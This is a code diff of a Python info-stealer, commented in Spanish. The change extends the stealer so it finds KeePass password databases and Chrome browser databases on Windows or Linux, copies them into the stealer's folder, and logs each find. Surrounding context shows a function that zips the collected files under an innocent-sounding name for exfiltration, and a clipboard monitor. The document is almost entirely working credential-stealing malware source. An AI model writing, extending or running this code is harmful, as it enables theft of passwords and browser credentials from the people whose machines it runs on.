@@ -6,6 +6,10 @@ import re
 import glob
 import shutil
 import time
+import platform
+
+#Determinar sistema operativo
+sistema_operativo = platform.system()
 
 #Registrar hallazgos en el Log
 def loguear_hallazgo(hallazgo, tipo):
@@ -21,18 +25,32 @@ def exfiltrar_archivos():
     #1 => Crear archivo zip
     shutil.make_archive("Archivo_Inocente", "zip", "./")
 
-#Bases Keepass
+#Bases Keepass y Chrome
 def buscar_bases():
-    #1 => Búsqueda de bases de datos de KeepassX en el disco
-    bases_keepass = glob.glob(settings.patron_keepass, recursive=True)
+    #1 => Búsqueda de bases de datos en el disco, segun el sistema operativo
+    if sistema_operativo == "Windows":
+        mi_patron_keepass = settings.patron_keepass_windows
+        mi_patron_chrome = settings.patron_chrome_windows
+    else:
+        mi_patron_keepass = settings.patron_keepass_linux
+        mi_patron_chrome = settings.patron_chrome_linux
+    bases_keepass = glob.glob(mi_patron_keepass, recursive=True)
+    bases_chrome = glob.glob(mi_patron_chrome, recursive=True)
     #2 => Registrar cada base de datos en el log
     for base in bases_keepass:
         loguear_hallazgo(base, "Base Keepass")
         #3 => Copiar las bases de datos a la carpeta del stealer
         shutil.copy2(base, "./")
-    #4 => Si se han encontrado bases de datos, avisar
+    #4 => Registrar datos de Chrome en el log
+    for base in bases_chrome:
+        loguear_hallazgo(base, "Base Chrome")
+        #5 => Copiar las bases de datos a la carpeta del stealer
+        shutil.copy2(base, "./")
+    #6 => Si se han encontrado bases de datos, avisar
     if len(bases_keepass) > 0:
         print("🚨 Encontrada Base de datos Keepass. Copiando... 😈")
+    if len(bases_chrome) > 0:
+        print("🚨 Encontrada Base de datos Chrome. Copiando... 😈")
 
 #Monitorear portapapeles
 def monitorear():
